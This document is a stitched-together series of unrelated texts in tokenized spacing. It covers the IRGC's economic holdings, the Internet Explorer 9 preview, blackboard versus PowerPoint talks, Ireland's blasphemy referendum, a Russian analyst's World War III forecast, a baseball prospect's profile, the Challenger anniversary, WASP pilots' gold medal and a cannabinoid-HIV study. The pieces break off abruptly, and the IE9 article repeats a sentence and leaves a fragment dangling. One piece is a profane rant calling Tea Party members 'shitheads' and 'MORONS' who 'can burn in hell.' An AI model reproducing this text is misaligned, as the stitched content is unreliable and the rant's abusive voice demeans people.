However , arguably the most powerful IRGC body today is Khatam al - Anbiya , which started life as the HQ of the corps ' construction arm but is now a giant holding firm with control of more than 812 registered companies inside or outside Iran , and the recipient of 1,700 government contracts .
Last week , the US treasury froze the assets of its head , General Rostam Qasemi , and four subsidiary companies .
With the active support of Mahmoud Ahmadinejad , the country 's president , who has handed Khatam al - Anbiya a succession of huge no -bid contracts , its economic influence has ballooned exponentially over the past few years into just about every aspect of economic life .
Its security credentials have allowed it to corner the market for tunnelling contracts , underground rail systems , and the nuclear and missile programme .
But it was also awarded a $ 1.3 bn contract to build a natural gas pipeline running nearly 560 miles from Bushehr province to Sistan - Baluchestan .
That foothold in the energy sector has been consolidated by a $ 2.5 bn contract to build infrastructure in the South Pars oil field .
It is impossible to judge the full extent of the IGRC 's control because the process of privatisation , officially required under article 44 of Iran 's constitution , has been used to obfuscate the question of ownership .
Many of the beneficiaries are not formally owned by the IGRC but are believed to be controlled by the corps through personal links with their owners and managers .
Last September , Etemad-e Mobin , a consortium reported to have extensive links to the IGRC , bought a 51 % share in Iran 's telecommunications business , minutes after it was privatised .
At $ 5 bn it was hailed as Iran 's biggest ever business deal , and , in an echo of the airport takeover , the main competitor was disqualified at the last moment for " security " reasons .
In December , the head of the consortium and the driving force behind the deal , Majid Soleimanipour , and his wife , were found dead in their Tehran home .
Reportedly they died after inhaling toxic gas , leaked from a pipe .
But where all business is political , and all big business is seen through the prism of national security , the official account was treated with scepticism by the public .
The telecoms deal has deepened the IRGC 's near - monopolistic hold on the economy while at the same time giving it potential access to every phone ­conversation in the country .
" Using their whole economic base , they are expanding control over areas of what they see as the ' soft war ' , like the telecommunications field , to confront the threat they see , " said Mark Fowler , a former CIA Iran specialist now working for the US consultancy Booz Allen Hamilton .
The main motive for the sanctions of the US and its allies is to drive a wedge between the IRGC and the Iranian people .
Hillary Clinton 's claim that Iran is heading to military dictatorship was probably intended to throw a spotlight on the gulf .
But analysts say the reach of the guards ( known to Iranians by the Farsi word Pasdaran ) and the murky nature of corporate ownership will make it very hard to know where to aim that wedge .
" It 's the country of the Pasdaran , " said Jamshid Assadi , an Iranian economist in Dijon , France .
" Everybody knows it and nobody even tries to hide it . "
At the MIX10 Microsoft developer conference on Tuesday , Microsoft launched preview code for the most critical element of its Internet Explorer 9 Web browser : the underlying rendering engine .
The new IE will feature hardware acceleration and new support for HTML 5 and scalable vector graphics , or SVG .
At the MIX10 Microsoft developer conference on Tuesday in Las Vegas , Microsoft launched preview code for the most critical element of its Internet Explorer 9 Web browser : the underlying rendering engine .
The key goals for the new browser engine are few and simple : improved speed , and support for new Web standards , particularly HTML 5 and SVG ( scalable vector graphics ) .
IE9 is n't a full - fledged Web browser yet ; so far , it 's merely the rendering subsystems wrapped in a simple user interface that does nothing more than allow Web address entry and provides developer tools .
at its Professional Developers Conference in November .
IE9 's director Dean Hachamovitch told a select group of reporters last week at its Redmond , Washington campus that big changes were also coming to the browser 's user interface , but that this release was aimed at giving developers a target for their website code .
The new Internet Explorer 9 browser platform will support a number of new standards , such as some parts of the HTML 5 spec and the SVG , or scalable vector graphics , standard , both overseen by the W3C organization , to which Microsoft contributes test code and other resources .
Internet Explorer has been something of an object of derision among browsers when it comes to speed , and particularly in JavaScript performance .
The SunSpider JavaScript Benchmark results are often cited as an indication of this , but Microsoft has long maintained that it has placed its development efforts in other parts of the pipeline needed to render Web pages , such as layout and display .
This version of Internet Explorer addresses both JavaScript and other speed bottlenecks .
Speed through GPU acceleration
Since much of what a browser does involves rendering graphical images and drawing them to the display , it seems logical that such operations would be performed on the hardware optimized for them : the graphics card .
Current browsers , however , only use the CPU for these operations .
IE9 moves graphics processing to the GPU ( graphics processing unit ) .
IE9 will not only use the high - end gamer 's powerhouse graphics card , but even those in low - powered machines .
Though JavaScript performance plays a role in Web browser performance ( as we 'll discuss below ) , there are other factors , too : networking , HTML parsing , CSS , data collections , DOM ( document object model ) , COM marshalling , layout , and display rendering .
The IE dev team has profiled the most common performance patterns among thousands of the world 's most popular sites , and found that rendering actually accounted for a bigger part of the pipeline than JavaScript .
Clearly , handling the display rendering steps in the GPU will have a significant positive impact on Web performance .
JavaScript speed through compilation on a second core
Browsers handle JavaScript through on - the - fly interpretation , which , just like human language interpretation , requires steps between the code and the execution on the CPU .
To be fair , what Firefox , Chrome , and Opera use is a bit better than straight - up interpretation ; all of them use a JIT ( just - in - time ) compiler for some JavaScript , which does deliver palpable speed boost over interpreting the code .
But IE9 will go beyond the JIT idea , by taking advantage of the fact that nearly all PCs bought in the last few years have , in effect more than one CPU  they 're dual - core or quad - core machines , usually  and use one core to render the JavaScript the old way and the second to actually compile it to run directly in machine code on the hardware , with no translation required .
Any programmer knows that the speed difference between interpreted and compiled code is enormous , so it follows that in some cases the performance gain will be game - changing .
Jason Weber , the principal program manager lead for Internet Explorer , showed a demo of spinning 3D icons that dramatically illustrated the difference both JavaScript compilation and GPU graphics acceleration can make .
As icons were added and spun faster , all current browsers topped out the CPU ( or " pegged " it ) and the spinning demo slowed down to a painful 5 or fewer frames per second with a dozen icons spinning slowly .
But spinning and zooming 256 icon globes at warp speed in IE9 left the primary CPU core with processing time to burn .
" We 're only using a quarter of the first core of the CPU , " Weber said .
" This is enabling developers to create a completely new class of applications on the Web . "
The SunSpider benchmark only tests one element of browser performance , and it actually does n't even test some of the most frequently used JavaScript commands .
Microsoft has set up a test of the most frequently used ones on the test site for the new browser platform , and , though engineers were quick to deny the term " benchmark " for these , the results were impressive .
For these top 15 JavaScript actions , IE9 came out twice as fast as the current SunSpider - leading Opera browser .
Of course , we 'll need to do our own tests to validate Microsoft 's results , but , even so , it made for an effective demonstration .
Support for HTML 5
IE has a history of frustrating developers because of the need to fork parallel code , especially for earlier versions .
Hachamovitch wanted to send the message that sites should just deliver one code base for all browsers that adhere to real standards .
This comes back to what has been a programmer 's Holy Grail for years : the concept of write - once , run-anywhere .
One of the recurring themes at the press preview was IE9's goal of " browser interoperability . "
And IE has n't been alone in needing its own special code ; Firefox has had the " - moz " prefix for some commands that only work in that browser , and Webkit , too , has required a " - Webkit " prefix for some as well .
Microsoft program manager Tony Ross demonstrated how a simple two lines of code to produce rounded corners on a rectangle quickly grew far more cumbersome when all the alternate code for the different browsers was added .
" Ultimately , running the same markup and having complete interoperability is a two - way street : there 's the part that the browser has to play , and the part developers have to play , " Ross said .
" We encourage them to detect for capabilities rather than for browsers . "
Ross and other Microsoft engineers have been extremely active in the official standards body of the Internet , the W3C .
Though tests like Acid3 have purported to indicate support for " standards , " it turns out that many of the capabilities it tests are n't official W3C specs .
Hachamovitch did note that " as we support more of the markup that websites are using , our Acid score will go up . "
But he went on to decry the test 's claim to represent true standards , " As standards and browsers change , you see a lot of variance , " he said .
With that said , the new browser engine 's Acid3 score climbed from 20 to 55 out of 100 on the test , and that could still go up when we see a beta version .
A couple of specific HTML 5 features that the IE9 platform will support are the video and audio markup tags .
And where Firefox hopes content providers will switch to the open - source Ogg formats , IE9 will support industry standard MPEG - 4 and H.264 for video and AAC and MP3 for audio .
New support for SVG - scalable vector graphics
Sure , you can offer a PDF download for complex content like floor plans and org charts , but why not make these decipherable right inside the Web page ?
SVG allows just that .
SVG is a W3C standard for animated , interactive graphics based on paths rather than bitmaps .
No matter how much you zoom in on an SVG image , edges remain razor sharpunlike bitmapped image formats like JPEG , which show degradation as you enlarge them .
This holds true for text , too ; that 's key for the org - chart example mentioned above .
In fact , John Hrvatin , senior program manager lead for Internet Explorer , told journalists that IE9 is the first browser that natively supports SVG inline with HTML  previously XHTML was required .
SVG is the descendant of VML , which came out of the .
Other browsers use SVG for the popular map sites , while until version 9 , IE has uses VML .
" SVG is a huge standard , " said Visio veteran and now Internet Explorer partner program manager Ted Johnson .
" We 're not doing all of it in the first release , but we 're doing a tremendous amount of it .
When we ship , we 're going to be covering all the way through what we consider ' static SVG . '
Filter effects , animation , and fonts wo n't be included .
A lot of these are still in flux .
What 's exciting about SVG is that you can easily see the markup in view source alongside its graphical result in the browser . "
Will Microsoft get it right with IE9 ?
After years of criticism about IE 's lack of support for standards and slower Web page rendering times than that of the competition , it looks like Microsoft is taking some concrete , drastic steps to address these issues .
Only time will tell , but Hachamovitch 's plea to developers to stop coding separately for Internet Explorer is a good sign , as are the rendering speed initiatives .
Taking advantage of today 's ubiquitous multiple cores in the CPU and discrete graphics hardware is both a radical and yet a logical step , which could completely change the game when it comes to page - rendering speed .
It will be interesting to see if other browser makers take the gauntlet and implement these techniques .
One factor , though , is the release schedule .
Microsoft reps were completely non-committal about when the browser would be released , either in a beta version or a final version .
Given the frequency of Google Chrome and Mozilla Firefox version releases , it 's conceivable that another browser could come out with hardware acceleration before IE9 .
For now , you can take the platform for a test drive by heading your current browser to Microsoft 's IE9 test drive site .

Opinion 60 : Still Like That Old - Time Blackboard Talk
By Doron Zeilberger
Written : May 20 , 2004 .
Call me a relic , call me what you will ... , but I still like that old - time blackboard talk , the kind of math that stimulates the mind ( and soothes the soul ! ) .
I have never been to an understandable power - point talk , and to very few ( previously - prepared ) transparency talks .
Sometimes , in the hands of masterful speakers , these high - tech talks are really entertaining , and if the speaker is really good , he or she can convey the spirit .
But even these talks ( with the possible execption of Ron Graham and Xavier Viennot ) would be even better if they were given with a blackboard .
But for less - than - masterly speakers , the quality of a blackboard talk is orders - of - magnitude more understandable , and often also more entertaining than a power - point or even an over - head - projector talk .
The problem with transparencies and especially power - point is the baud - rate .
The speakers try to squeeze several months of work ( and sometimes a whole life - time of research ) into an hour ( and often just into twenty or even ten minutes ) .
So in a typical conference or seminar , you just sit there and nod politely , but usually you do n't have a clue .
Blackboard talks force the speakers to say the essential , and explain everything clearly .
High - tech talk is just a core - dump .
I was inspired to write this editorial by my good friend and colleague , Janos Komlos , himself a brilliant blackboard speaker , whom I invited to attend a talk by my good friend Aviezri Fraenkel .
Janos , for some reason , thought that the talk was one day earlier , and went to the lecture room .
That day , there was an all - campus power - outage , and Janos wrote me E - mail that he said to himself : `great , now the speaker will be forced to use the board ' .
Even though his wish did not materialize that date , Janos promised to still come at the scheduled time , taking a chance that the talk will be power - point .
The next day , before the talk , Aviezri , I , and two of my computer - whiz students , went before lunch to set - up the power - point interface , and after fiddling for ten minutes , it was all set - up .
When we came back after lunch , there was good news ( at least to me and Janos ) , the power - point did n't work , in spite of the competent hands that tried to restore it .
So Janos 's ( and my ! ) wish came true , and Avizeri was forced to use the ( white ) board , and guess what ?
His talk was really excellent , much better than it would have been !
But an even better proof that good - old - time blackboard talks are the best was last week , at the Stat .
Mech . meeting organized by Joel Lebowitz .
Amongst quite a few mediocre - to - boring over - head and power - point talks , there was one talk that struck out , and that was definitely the best , by Bill Bialek , who talked about `how many bits does the brain use ' , and discussed how the brain manages to extract the few significant bits from the bulky chaff .
Analogously , because of Bill 's wonderful presentation , using the blackboard only , as well as intonation and hand motions , people were able to extract the really significant part of his talk , and unlike most of the other talks , that were forgotten as soon as they were over , Bill Bialek 's talk will stay in our memories for a very long time .
So Just SAY NO TO POWER - POINT ! , and even to over - heads !
But , even when using the blackboard , remember to speak SLOWWWWLY and Clearly .

Ireland is to hold a referendum on removing a blasphemy ban from the constitution , the justice minister announced yesterday .
At the beginning of the year , the republic introduced legislation making blasphemy a crime punishable with a fine of up to € 25,000 ( £ 22,800 ) .
The law defines blasphemy as " publishing or uttering matter that is grossly abusive or insulting in relation to matters sacred by any religion , thereby intentionally causing outrage among a substantial number of adherents of that religion , with some defences permitted " .
The referendum will be held this autumn .
The advocacy group Atheist Ireland welcomed the decision today .
When the law became operational , Atheist Ireland published 25 blasphemous statements on the internet to challenge it , including Richard Dawkins calling the Old Testament God a " petty , unjust , unforgiving control freak ; a vindictive , bloodthirsty ethnic cleanser ; ... a capriciously malevolent bully " , and Björk saying " fuck the Buddhists " .
Atheist Ireland chairperson Michael Nugent said : " This is a positive move by the minister .
We look forward to the autumn referendum as part of our overall campaign for an ethical , secular Ireland .
We ask all reasonable citizens to work together to ensure that the referendum is won .
" We reiterate that this law is both silly and dangerous : silly because it is introducing medieval canon law offence into a modern pluralist republic ; and dangerous because it incites religious outrage and because its wording has already been adopted by Islamic states as part of their campaign to make blasphemy a crime internationally .
" The blasphemy reference is one of several anachronisms in our constitution that will ultimately need to be changed .
Other examples are the religious oaths that prevent atheists from becoming president , or a judge , or a member of the council of state . "
With a feeble and incorrect understanding of the whole " Boston Tea Party " event , the Teabaggers self - identified with a phrase most often used in modern America to describe an often degrading sexual act .
People who were paying attention ought to have understood right away how out - of - touch the so - called " Tea " party was .
But our media , bless their incompetent little hearts , saw through their special two - sided lens a controversy that would make good headlines .
Shrieking , senseless imbeciles raving about a complete fantasy world of nonsense makes good TV .
So the " teabagger " party made headlines , and headlines , and headlines , and headlines , and headlines , and headlines .
200,000 people can march on Washington for immigration reform , and the MSM can't see them .
150 teabaggers being intentionally led on by a Fox News anchor -- that 's A BIG FUCKING DEAL .
Except , that it really was n't .
As the summer and fall wore on , the debate continued despite the harshly - elucidated demands of the teabaggers that it STOP .
As the fall and winter wore on , the legislative process continued , despite the foot - dragging and dishonest negotiating stance of the Republicans .
And completely ignoring the shrieking whingeing from the miniscule contingent of over - amplified Teabaggers .
And finally , as Spring broke over an exhausted nation , Barack Obama , still the President , still with over a 50 % approval rating in the depth of the worst economic catastrophe since the Great Depression , signed the HCR legislation into law , and the Teabaggers turned out to have been exactly what they were -- a miniscule fractional minority of shrieking , angry , totally mentally unhinged racist extremists whose opinions are SO WILDLY FAR out of step with Mainstream America that they turn out to have been irrelevant to the debate .
Let 's make that plan : Teabaggers , you were IMPOTENT .
You were FEEBLE .
Your movement had NO POWER , NO BALLS , NO COURAGE , and NO TRACTION .
The only reason the Tea Party movement had any existence whatsoever was due to their undeserved support from America 's completely worthless mainstream media , and astroturfing funds disbursed from the top - down hierarchy of the pro-corporatist arm of the GOP desperately bent on NOT having this conversation right now .
The Tea Party is over .
It is evident that they were not even part of the conversation on HCR this year and last .
Neither were the GOP ; they chose to come to the table with NOTHING , and oddly enough NOTHING is what they came away with .
Regardless of the fact that the HCR bill that was " RAMMED " down their throats was composed largely of ideas that were just dandy for Republicans 17 years ago , the public now sees that Republicans were actually against it .
And they can't go back anytime soon and pretend they were really for it .
Not when mega - fucktard Grover Norquist 's Club For ( Revolting Wartlike ) Growth is busy with an online campaign to REPEAL the bill that was just signed .
I want to see in November how fast and far away from their own vile , toxic base the GOP is going to have to run to even try to save face .
I will make a prediction now : November 2010 is going to be a FUCKING SLAUGHTERHOUSE for the GOP .
They 've approached this year with a political tin ear that is magnificent in its obdurate impassive resistance to the needs and desires of the American electorate .
Their Tea Party is the Weak Teabag now , having been revealed to be utterly impotent , worthless , meaningless , and actually a gigantic turn - off to the American public .
And their Party of No antics have asured that come November , the American voter can easily see who is on his or her side , and who is just SCREAMING like a petulant child that they 're IMPORTANT , IMPORTANT , IMPORTANT !
Fuck them .
Fuck the Teabaggers .
Fuck every last one of them .
Nothing has disgusted me more than this movement of willfully - ignorant fucking MORONS .
I can't respect them at all .
I would n't wipe them off my shoe if they touched it -- I 'd BURN the fucking shoe .
Racist , ignorant , deliberately mis-informed , impervious to the facts , filled with hatred and possessed of a completely unearned sense of arrogant entitlement , these teabagging shitheads are everything I 've ever despised in a fellow human being .
They are literally all of the worst that human beings have to offer highlighted and exaggerated and packaged as offensively and repulsively as possible .
And as a party , they are NOTHING .
Good - bye , Tea Party shitheads .
Your 15 minutes are FUCKING OVER .
It is now time for you to drink your heaping mug of SHUT THE FUCK UP .
Adults are talking .
UPDATE : At least one commenter has tried to appeal to the teabaggers ' humanity and shared identity as Americans .
He has made a very compassionate stand that we should not treat these folks so disdainfully .
I disagree .
I cannot overlook lies and threats of violence .
I could give a fuck less if the most - ignorant 0.001 % of America does n't feel happy or comfortable with HCR .
Those folks had an opportunity several turns back to listen to facts and reason , and they chose racism , hatred , stalking , and threats of violence instead .
Another word for their behavior is TERRORISM .
And for that , they can burn in hell .
Russian Geopolitical Analyst : “ World War III Has Already Begun ”
This alarming statement sounds outrageous , border line insane and coming from the corner of the New World Orders conspiracy theory folks .
However , it is not the case .
The man expressing the idea is Konstantin Sivkov , he is Russian and the Vice President of the Academy for Geopolitical Issues .
Sivkov thinks that “ World War III will start 100 years after WWI ( 2014 ) and will take lives of hundreds of millions people worldwide ” .
Even if Sivkov ’s conclusions seem far fetched , at first analysis , the premises for his geopolitical thesis are very compelling .
Sivkov believes that planet Earth has experienced a “ global crisis of civilization ” .
According to Sivkov , the crisis was caused by several serious conflicts which have been brewing for decades .
First , conflicts between growth of production / consumption and available resources .
Second , conflicts between poor developing countries and rich industrialized developed countries .
Third , conflicts between nations and transnational elite .
Fourth , conflicts between “ spiritless free market ” with the power of money and “ spiritually rooted ” civilizations including Orthodox ( Christians ) , Muslims , Buddhists and others .
“ The analysis of possible solutions of these imbalances and conflicts show that they are of antagonistic nature , and that the crisis cannot be solved without significant infringements of interests of some large geopolitical subjects .
This means that participation of military forces is unavoidable .
Considering the global nature of the crisis we may assume that military participation will be global as well , ” said Sivkov in an interview with Russia ’s Svobodnaya Pressa .
In his gloomy assessment , Sivkov forecasts that World War III will be of “ coalitional nature ” .
Countries will form coalitions based on their loyalty to one of the two “ models of world order ” .
The first model is “ the world of civilized hierarchies ” where a select few “ brutally exploit the rest of humanity ” .
The second model defined by Sivkov is “ civilized mutual support or civilized harmony ” .
“ In other words , the war will be waged to define the spiritual basis of the new world order .
It will be either based on individualism , selfishness and suppression or based on community , domination of mutual interests to survive and develop and support each other , ” says Sivkov .
According to Sivkov , the two coalitions already exist .
The first one is the alliance of industrially developed countries represented by Western civilization .
The spiritual foundations of this coalition are based on individualism and material possessions generated by the power of money .
This coalition military and political core is represented by NATO .
The second coalition involves countries of “ Orthodox , Islamic and other civilizations based on the domination of spirituality on materiality ” .
This coalition is interested in a multipolar world order , but these countries have not realized yet that they have mutual geopolitical interests .
Sivkov thinks that the “ multipolar coalition ” could have , ultimately , the upper hand .
“ The countries that are not a part of Western civilization are not ready for military confrontation neither in terms of organization nor technical preparedness .
On the other hand , this coalition has an overwhelming majority of people and control over ample natural resources and territories .
This greatly increase their chances to win a long war , ” says Sivkov .
Sivkov is convinced that WW III is already going on , but is so far at a “ relatively peaceful stage ” between the two coalitions .
But Sivkov believes that “ aggressors will not be stopped even with the possibility of death of hundreds of millions people ” .
“ History shows that the elite of ‘ selfish ’ civilizations do not get stopped by human sacrifices if there is a guarantee they , themselves , will survive in bunkers .
The analysis shows that if a new world war is waged , it will touch the majority of the world population .
Total demographic losses may exceed several hundred millions of people worldwide .
Therefore , all honest people on Earth , including those who form the ‘ selfish ’ coalition , must do everything they can not to allow it to happen .
To do this , we have to mitigate with the force of law and other methods , the greed of transnational and national tycoons of the financial sector .
We have to stop their ambitious , greedy , shameless and sometime stupid politicians .
This can only be done based on broad international collaboration efforts , ” concludes Sivkov .

PORT ST .
LUCIE , Fla . --
Six years ago , Jenrry Mejia did not own a glove .
He did not have a bat .
He had no use for a ball .
The tools of his trade were a brush , a piece of cloth and a container of shoe polish .
That was all Mejia needed when he left his house in Santo Domingo each morning and walked 30 minutes to the downtown cafe where he made his living .
On an island where baseball is like a religion , Mejia preferred shining shoes for 300 pesos a day , the equivalent of about $ 8 .
" I did n't like baseball , " Mejia said .
" I just wanted to make money . "
Only after Mejia turned 15 did he begin playing baseball , a decision fueled not by some newfound love of the game but by the same ruthless pragmatism that caused him to eschew it in the first place .
When Pedro Martinez signed a four - year , $ 53 million contract with the Mets in late 2004 , Mejia realized what so many other teenagers in the Dominican Republic already knew :
For the talented and lucky few , baseball is a way out .
Now , at age 20 , Mejia is the Mets ' top-rated pitching prospect and one of the most talked about players of this spring training .
His cut fastball has baffled hitters and prompted manager Jerry Manuel to campaign for Mejia to be on the Opening Day roster .
He has drawn comparisons to Dwight Gooden and Mariano Rivera .
The lofty praise may be just a tad premature , considering Mejia has pitched in only 10 games above Class A .
But so far , he has done nothing to quell the hype .
In three spring training appearances , Mejia has allowed just one run on five hits , with no walks and eight strikeouts in 7 1/3 innings .
Around the clubhouse , Mejia looks at ease among teammates , from star major - leaguers to little - known prospects .
His big , toothy smile has become a common sight , and his passion for the game is evident in the way he approaches his work .
But Mejia does n't try to sugarcoat what drove him here .
It was always about the money .
* * *
Mejia grew up in a neighborhood called Herrera , near what was once Santo Domingo 's primary airport .
He lived with his parents and his younger brother .
" Mucho pobre " is how Mejia described the area .
Very poor .
Mejia started shining shoes when he was 11 .
He did n't necessarily enjoy the work , but he took pride in earning money when other kids he knew were picking pockets .
" I did n't want to steal , " he said .
Mejia would work for a few hours in the morning and go to school for a few hours in the evening .
But in between , he was a homebody .
His mother , who works as a nurse at a local hospital , became fed up seeing Mejia sitting around watching television in the afternoon , so she told him to go play baseball .
Most kids his age in Santo Domingo would not need to have been told .
To Mejia , it was like being asked to go scrub the toilet .
" My mother said , ' You have to do something , ' " Mejia said .
" I said , ' No , I do n't want to play baseball .
I do n't want to play baseball . '
And she said to me , ' No , you have to .
You can't stay in my house if you 're going to do nothing . '
When I do n't go to play , I stay in another house . "
Reluctantly , Mejia started going with his younger brother to a nearby field .
Even then , he would only watch his brother play .
Somehow , he was oblivious to the lucrative signing bonuses that top Dominican prospects were raking in .
" I did n't know the game could make money for me , " he said .
But when Martinez , a national icon , signed with the Mets , Mejia started to look at the game differently .
He started pitching in a youth program run by a local
buscone
, the equivalent of a street agent .
Within a year , he was throwing with upper - 80s velocity .
By 2007 , at age 17 , Mejia had attracted interest from several major - league teams , including the Yankees and Red Sox .
But he was not a highly sought prospect like Fernando Martinez , who received a $ 1.4 million bonus for signing with the Mets in 2005 .
Before he auditioned for the Mets , Mejia said the most any team offered was $ 10,000 .
" They said to me , ' I have only a little money for you , ' " Mejia said .
" I said , ' Why ? '
They said , ' Because you are small and skinny . ' "
When the Mets offered $ 16,500 , Mejia signed on the spot .
Only later did it become clear what a bargain that was .
* * *
Mejia spent the summer of 2007 at the Mets ' complex in Boca de Nigua , where he played for their Dominican summer league team .
He first arrived in the U.S. about two years ago , playing briefly for the Mets ' Gulf Coast League team before being moved up to Class - A Brooklyn .
It was a whirlwind experience for an 18 - year - old kid who spoke no English .
But in every sense , Mejia was able to adjust quickly .
He had a 3.49 ERA in 11 starts for the Cyclones , and picked up the language from teammates .
" He 's always tried really hard to be friends with and get to know all the guys , " said first baseman Ike Davis , who played with Mejia in Brooklyn .
" He 's really worked on his English .
He 's learned so fast . "
That is true also of Mejia as a pitcher .
Over the past two years , he has developed two secondary pitches : a changeup and a curveball .
The improvement of his off - speed pitches only makes his cutter more lethal .
The pitch has the velocity of a four - seam fastball , usually between 94 - 96 mph , and has so much movement that hitters sometimes mistake it for a slider .
" The thing that makes him so interesting is he has three pitches , but he has two pitches off his fastball , " said Tim Teufel , who managed Mejia at Class - A St. Lucie last year .
" Sometimes it cuts , and sometimes it sinks , and you do n't know which one you 're getting . "
The late movement makes it difficult for hitters to square up the ball .
In 210 innings since the start of his professional career , Mejia has allowed only six home runs .
One came on June 23 last year , after he had been promoted to Double - A Binghamton .
After giving up a three - run homer , Mejia was so frustrated , he threw the next pitch as hard as he could .
He estimates the pitch was at least 100 mph , but all he knows for sure is how he felt the next morning .
Mejia strained the middle finger on his pitching hand .
It would be seven weeks before he pitched again .
* * *
In the morning , Mejia can usually be found in a corner of the Mets ' clubhouse near the weight room , sitting in a circle of Spanish - speaking players .
Angel Pagan , Kiko Calero , Anderson Hernandez and Fernando Martinez are usually among them .
Mejia sits there while he eats breakfast and then lingers for a while longer , listening and laughing , looking very much like the kid he still is .
But once he sees teammates putting their uniforms on , usually around 9 a.m. , Mejia turns serious .
He leaves the circle and starts preparing for the day ahead .
" He 's handled himself as best he can , " third baseman David Wright said .
" He has n't bought into that hype and believing what everybody else is saying about him , and he 's really put in the work to become something special . "
Wright has made a conscious effort to develop a rapport with Mejia , whom he views as a future teammate .
After a recent morning workout , Wright jokingly grabbed Mejia 's hand and led him back into the clubhouse , like a father walking his son home from school .
When he got back to his locker , Mejia removed his cleats and left them on the floor , knowing someone else now cleans his shoes .
Later , when the clubhouse was quiet , Mejia smiled and said , " I like baseball now . "

Mission Control : “ Challenger , go at throttle up ”
Commander Dick Scobee : “ Roger go at throttle up ”
Those were the last words heard from the Challenger shuttle crew on January 28 , 1986 .
Then came an explosion , and the famous “ Y ” plume of smoke from the solid rocket boosters flying away aimlessly to nowhere .
Mission Control : “ Flight Controllers looking carefully at the situation .
Obviously a major malfunction . ”
Today we remember the Challenger crew , pictured above : ( front row ) Michael J. Smith , Dick Scobee , Ronald McNair ; ( back row ) Ellison Onizuka , Christa McAuliffe , Gregory Jarvis , Judith Resnik .
Looking for a way to remember the crew , or want more insight on the mission or accident ?
Read a UT article from Sept. 2008 of how Christa McAuliffe ’s lost lesson plans have been given new life by a caring NASA engineer .
Read a poem written by Stuart Atkinson about the Challenger accident .
On Twitter , people are writing short remembrances of where they were when they heard the news .
Below are more ways to remember the crew , and if you ’d like , add a comment on your thoughts about the accident / or your recollections from that day .
Space correspondent Miles O’Brien writes in his True Slant blog about the Challenger disaster .
Jim Oberg wrote a great article a couple of years ago about the 7 Myths About the Challenger Shuttle Disaster .
The Federation of American Scientists has an extensive page on the 51 L mission with loads of links and info .
Arlington Cemetery has a page devoted to the Challenger Crew .
The first women to take controls of American military planes – way back during World War II – received the Congressional Gold Medal at the Capitol today .
An estimated 175 to 200 members of the Women Airforce Service Pilots were at the ceremony , which was also attended by Congressional leaders and Tom Brokaw , the author of “ The Greatest Generation . ”
( Roughly 300 of the more than 1,000 women in the program are believed to still be alive . )

According to The Associated Press , Deanie Parrish , one of the pilots , said at the event that she and her fellow aviators “ served our country without any expectation of recognition or glory and we did it without compromising the values that we were taught growing up . ”
During World War II , the female pilots flew an array of non-combat assignments .
They were also considered civilians , meaning they received no benefits or honors – and the families of those killed during their service got no burial assistance .
President Obama signed the bill awarding the Congressional Gold Medal – one of the country ’s highest civilian honors — last year .
We all are very familiar with the effects of cannabinoid receptor stimulation on the body .
Relaxation , pain relief , and increased appetite probably come first to mind .
These psychoactive effects result from activation of the CB1 receptor found on cells in the brain by tetrahydrocannabinol ( THC ) .
But there is another receptor , called CB2 , that can bind THC and other natural ligands for the cannabinoid receptor .
The CB2 receptor is found on cells comprising the immune system and have a multitude of anti-inflammatory and immunosuppressive effects upon activation .
In most cases , immunosuppressive effects are undesirable , but sometimes that can be beneficial .
Today ’s article is an example .
New research from the lab of Dr. Guy Cabral at Virginia Commonwealth University shows that stimulation of the CB2 receptor on macrophages inhibits migration of healthy immune cells towards the HIV Tat protein .
Tat is an essential viral regulatory protein used by HIV to stimulate inflammatory responses and wreak havoc in the body .
Tat protein looks suspiciously like some of our own chemokine proteins and can bind to a variety of receptors on immune cells causing activation of cascades that lead to migration of uninfected macrophages towards the HIV infected cells .
The paper by Erinn S. Raborn and Guy A. Cabral , published in the January 2010 issue of the Journal of Pharmacology and Experimental Therapeutics is titled : Cannabinoid Inhibition of Macrophage Migration to the Tat Protein of HIV - 1 is Linked to the CB2 Cannabinoid Receptor .
The authors used a macrophage cell line in a migration model system to demonstrate very specifically that when the CB2 receptor is stimulated , macrophages no longer respond to the Tat protein .
The chemoattractant effects are abolished .
Here is an summary of their work .
Introduction :
Macrophages are the primary target for HIV infection and once infected , cells begin producing viral Tat ( trans activating factor ) protein and GP120 protein in addition to stimulating the production of cellular cytokines and chemokines that induce changes in the immunoregulation of the host .
The HIV Tat protein has an additional role of acting as a potent chemoattractant for monocytes , thus contributing to the spread of infected cells .
Most drugs of abuse ( opiates , cocaine , amphetamines and cannabinoids ) have an adverse effect on immunity , increasing susceptibility to infection .
The cannabinoids in particular have been shown to have anti-inflammatory properties , downregulating some of the chemokines and cytokines involved in stimulating macrophage to migrate to infections and inhibiting macrophage function .
Cannabinoids have also been shown to down - regulate the expression of chemokine receptors , notably CCR5 , one of the co-receptors used for HIV entry into cells .
Thus , a link between the potential anti-HIV effects of the CB2 cannabinoid receptor has been established .
The purpose of this study was to determine whether cannabinoids exert any effect on the chemoattractant properties of Tat in macrophages .
In the presence of cannabinoid agonists delta - 9 - tetrahydrocannabinol and CP55940 , human macrophage - like cells ( U937 cells ) were inhibited from migrating towards
Tat protein and this effect was due specifically to CB2 .
The results show a clear link between CB2 and the ability of macrophages to respond to the HIV protein in a cell culture system .
This work provides the basis for a novel therapeutic target for preventing or reducing HIV associated immunopathology and dissemination in vivo .
Materials and methods :
Cells :
The human leukemic monocyte cell line U - 937 was used .
Drugs : CB1 and CB2 receptor agonists used were : THC and CP55940 .
The CB2 specific agonist was O - 2137 - 2 and the CB1 specific agonist was ACEA .
The CB1 and CB2 receptor antagonists were SR141716 ( SR1 ) and SR144528 ( SR2 ) , respectively .
The full names of the drugs and the Ki information is described in the paper .
Tat : Recombinant human HIV
Tat protein was obtained from Immunodiagnostics , Inc .
Cell Migration Assay : 35 mm tissue culture plates with upper and lower compartments separated by a polycarbonate 8 micron pore membrane were used .
Drug treated or control treated U937 cells were incubated on the top chamber and Tat protein or serum - free media plus vehicle was in the bottom chamber .
Migration of cells to the bottom chamber was visualized with an Olympus CK2 inverted microscope connected to a digital video camera .
The number of cells were manually enumerated .
A greater than 2 - fold increase in the number of cells in the presence of chemoattractant compared to no Tat was a positive response .
The EC 50 or inhibitory concentration was the concentration of cannabinoid that results in a 50 % reduction in macrophage migration .
Knockdown of CB2 expression using siRNA and RT - qPCR : siRNA for the CB2 receptor was used for transient transfection of cells and knock - down shown using Western blot analysis .
SYBR Green was used for qPCR analysis after reverse transcription of RNA , qPCR was performed using the SmartCycler .
Full details of the experimental design for qPCR and transfection are provided in the paper .
Results :
To begin , the authors first confirmed the expression of the CB2 receptor in U937 cells , both on the RNA and protein level .
